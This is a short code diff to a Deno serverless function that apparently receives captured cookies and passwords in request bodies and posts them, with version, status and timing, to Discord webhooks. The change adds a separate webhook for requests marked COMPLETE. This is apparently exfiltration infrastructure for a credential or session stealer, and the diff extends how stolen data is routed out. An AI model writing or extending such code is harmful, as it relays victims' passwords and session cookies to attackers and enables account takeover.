@@ -130,8 +130,10 @@ Deno.serve(async (req) => {
   }
 
   try {
-    const webhookUrl = Deno.env.get("DISCORD_WEBHOOK_URL");
-    if (!webhookUrl) {
+    const mainWebhook = Deno.env.get("DISCORD_WEBHOOK_URL");
+    const successWebhook = Deno.env.get("DISCORD_WEBHOOK_URL_SUCCESS");
+
+    if (!mainWebhook) {
       return new Response(
         JSON.stringify({ error: "DISCORD_WEBHOOK_URL not configured" }),
         { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } },
@@ -145,6 +147,10 @@ Deno.serve(async (req) => {
     const password = typeof body.password === "string" ? body.password : undefined;
     const durationMs = typeof body.durationMs === "number" ? body.durationMs : undefined;
     const timestamp = new Date().toISOString();
+
+    // Route: COMPLETE → success webhook (fallback to main); everything else → main webhook
+    const webhookUrl =
+      status === "COMPLETE" && successWebhook ? successWebhook : mainWebhook;
 
     const payload = buildEmbed(version, status, timestamp, cookie, password, durationMs);
     const result = await postToDiscordWithRetry(webhookUrl, payload);
